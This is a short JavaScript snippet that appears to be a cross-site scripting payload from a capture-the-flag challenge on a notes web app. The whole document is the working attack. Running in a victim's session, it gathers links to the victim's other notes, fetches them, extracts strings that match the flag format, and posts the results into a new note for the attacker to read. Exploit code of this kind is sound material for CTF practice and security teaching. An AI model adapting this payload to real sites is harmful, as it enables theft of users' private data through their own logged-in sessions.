fetch('/').then(r=>r.text()).then(h=>{
  let notes=h.match(/\/note\/[a-f0-9]+/g)||[];
  let unique=[...new Set(notes)];
  let current=location.pathname;
  let others=unique.filter(n=>n!==current);
  
  // Fetch each note and look for flag
  Promise.all(others.map(n=>fetch(n).then(r=>r.text()))).then(pages=>{
    let allText=pages.join('\n---\n');
    let flags=allText.match(/uoftctf\{[^}]+\}/g)||['NO_FLAG_FOUND'];
    fetch('/note/new',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'title=FLAG&body='+encodeURIComponent(flags.join(',')+'\n\nNotes:'+others.join(','))
    });
  });
});
